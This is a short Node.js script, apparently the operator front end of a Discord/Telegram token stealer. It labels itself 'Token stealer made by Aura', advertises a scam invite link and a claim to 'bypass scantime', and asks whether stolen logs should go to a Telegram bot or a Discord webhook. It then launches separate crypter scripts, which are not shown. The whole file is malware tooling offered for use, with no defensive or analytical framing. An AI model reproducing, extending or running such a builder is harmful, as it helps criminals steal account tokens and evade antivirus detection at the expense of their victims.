const readlineSync = require('readline-sync');
const { spawnSync } = require('child_process');
const colors = require('colors');

// Set console title
process.stdout.write('\x1b]2;Token stealer made by Aura\x07 '.repeat(9));

// Install npm packages globally without waiting for input
const npmInstallResult = spawnSync('npm', ['install', '-g', 'readline-sync', 'colors'], { stdio: 'inherit' });

// Clear the console
console.clear();

// Display custom messages with color
console.log('\n\n\n');
console.log('token stealer: dsc.gg/wantscam')
console.log('bypass scantime')
console.log('\n\n\n');

// Ask the user to choose the logging method
const logMethod = readlineSync.question('  '.white + '['.white + '?'.blue + ']'.white + ' Wanna receive log by (1: Telegram Bot, 2: Discord Webhook)>>> '.white,);

if (logMethod === '1') {
    // Run cryptertele.js for Telegram logging
    const teleProcess = spawnSync('node', ['cryptertele.js'], { stdio: 'inherit' });
    if (teleProcess.status === 0) {
        console.log('');
    } else {
        console.error(`Error executing Telegram script. Exit code: ${teleProcess.status}`);
    }
} else if (logMethod === '2') {
    // Run crypter.js for Discord Webhook logging
    const discordProcess = spawnSync('node', ['crypter.js'], { stdio: 'inherit' });
    if (discordProcess.status === 0) {
        console.log('');
    } else {
        console.error(`Error executing Discord script. Exit code: ${discordProcess.status}`);
    }
} else {
    console.log('Invalid choice. Exiting...');
    setTimeout(() => process.exit(), 5000);
}
